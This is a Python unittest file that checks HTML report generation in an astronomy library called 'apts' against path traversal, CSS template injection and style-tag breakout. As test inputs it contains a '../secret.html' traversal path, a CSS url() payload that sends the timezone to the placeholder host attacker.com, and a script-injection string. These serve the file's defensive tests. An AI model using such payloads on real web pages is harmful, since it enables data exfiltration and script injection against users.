import unittest
import os
from apts import Place, Equipment, Observation

class TestSentinelSecurityEnhanced(unittest.TestCase):
    def setUp(self):
        self.place = Place(52.2, 21.0, name="Warsaw")
        self.equipment = Equipment()
        self.obs = Observation(self.place, self.equipment)

    def test_custom_template_absolute_path_allowed(self):
        # Create a dummy template file
        template_file = "test_abs_template.html"
        with open(template_file, "w") as f:
            f.write("Absolute Template: $place_name")

        abs_path = os.path.abspath(template_file)

        try:
            html = self.obs.to_html(custom_template=abs_path)
            self.assertIn("Absolute Template: Warsaw", html)
        finally:
            if os.path.exists(template_file):
                os.remove(template_file)

    def test_custom_template_path_traversal_blocked(self):
        # Even if not absolute, '..' should be blocked
        with self.assertRaises(ValueError) as cm:
            self.obs.to_html(custom_template="../secret.html")
        self.assertIn("Path traversal", str(cm.exception))

    def test_css_template_injection_prevented(self):
        # Attacker tries to leak data via CSS
        malicious_css = "body { background: url('http://attacker.com/leak?tz=${timezone}'); }"
        html = self.obs.to_html(css=malicious_css)

        # In the output, it should remain ${timezone} or $${timezone} if we were looking at raw Template
        # string.Template.substitute will turn $$ to $
        self.assertIn("leak?tz=${timezone}", html)
        # It should NOT be replaced by the actual timezone
        self.assertNotIn("leak?tz=Europe/Warsaw", html)
        self.assertNotIn("leak?tz=UTC", html)

    def test_css_style_breakout_prevented(self):
        # Existing check for </style> should work for variations
        malicious_css = "</style ><script>alert(1)</script><style>"
        html = self.obs.to_html(css=malicious_css)
        self.assertNotIn("</style >", html)
        self.assertIn("<script>alert(1)</script>", html) # It's still in the template, but NOT breaking the style tag

if __name__ == "__main__":
    unittest.main()
